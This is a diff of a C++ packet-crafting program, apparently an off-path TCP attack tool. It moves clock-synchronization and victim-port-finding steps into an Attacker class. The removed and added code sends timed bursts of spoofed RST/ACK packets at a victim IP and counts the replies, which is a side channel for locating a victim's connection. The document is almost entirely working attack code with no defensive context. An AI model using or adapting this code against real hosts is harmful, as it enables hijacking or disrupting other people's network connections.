@@ -5,7 +5,7 @@
 
 #include "common.h"
 #include "packet_counter.h"
-#include "port_finder.h"
+#include "attacker.h"
 
 using namespace std;
 using namespace std::chrono_literals;
@@ -54,54 +54,6 @@ pair<ConnectionID, uint32_t> waitAndGetLegitConnectionInfo(
     return make_pair(connection, lastSeq);
 }
 
-milliseconds synchronizeClock(const ConnectionID& legitConn, int legitLastSeq) {
-    Tins::PacketSender sender;
-    
-    auto pkt = make_packet(legitConn, "RA", legitLastSeq + 3);    
-    auto pcounter = PacketCounter::instance();
-
-    uint32_t n1, n2;
-    {
-        cout << "Sending out 200 packets in 1 sec..." << endl;
-        pcounter->startCounting();
-        auto s = align_and_delay(0ms);
-        for (int i = 0; i < 200; i++) {
-            sender.send(pkt);
-            s += 5ms;
-            this_thread::sleep_until(system_clock::time_point(s));
-        }
-        this_thread::sleep_for(2s);
-        n1 = pcounter->stopCounting();
-        cout << "n1 = " << n1 << endl;
-    }
-
-    {
-        cout << "Sending out 200 packets in 1 sec and 5ms delay..." << endl;
-        pcounter->startCounting();
-        auto s = align_and_delay(5ms);
-        for (int i = 0; i < 200; i++) {
-            sender.send(pkt);
-            s += 5ms;
-            this_thread::sleep_until(system_clock::time_point(s));
-        }
-        this_thread::sleep_for(2s);
-        n2 = pcounter->stopCounting();
-        cout << "n2 = " << n2 << endl;
-    }
-
-    uint32_t delay_ms = 0;
-    if (n1 == 100) {
-        delay_ms = 0;
-    } else if (n2 == 100) {
-        delay_ms = 5;
-    } else if (n1 > n2) {
-        delay_ms = 5 + (n2 - 100) * 1000 / 200;
-    } else {
-        delay_ms = 5 + (300 - n2) * 1000 / 200;
-    }
-    return milliseconds(delay_ms);
-}
-
 void testClock(const ConnectionID& legitConn, int legitLastSeq, milliseconds delayMs) {
     auto pcounter = PacketCounter::instance();
     Tins::PacketSender sender;
@@ -130,15 +82,15 @@ int main() {
     auto legitLastSeq = legitInfo.second;
     cout << "Got legit connection info: " << legitConn.toString() << " " << legitLastSeq << endl;
 
+    Attacker attacker(legitConn, legitLastSeq, kVictimIP);
+
     printHeader("SYNCHRONIZING CLOCK...");
-    auto syncDelayMs = synchronizeClock(legitConn, legitLastSeq);
+    auto syncDelayMs = attacker.synchronizeClock();
     cout << "Synchronization delay: " << syncDelayMs.count() << "ms" << endl;
 
     printHeader("FINDING VICTIM'S PORT...");
-    PortFinder portFinder(legitConn, legitLastSeq, kVictimIP);
-    portFinder.setSyncDelayMs(syncDelayMs);
     try {
-        auto victimPort = portFinder.find(32000, 65535);
+        auto victimPort = attacker.find_port(32000, 65535);
         cout << "Victim's port: " << victimPort << endl;
     } catch (char const* err) {
         cout << "Error: " << err << endl;
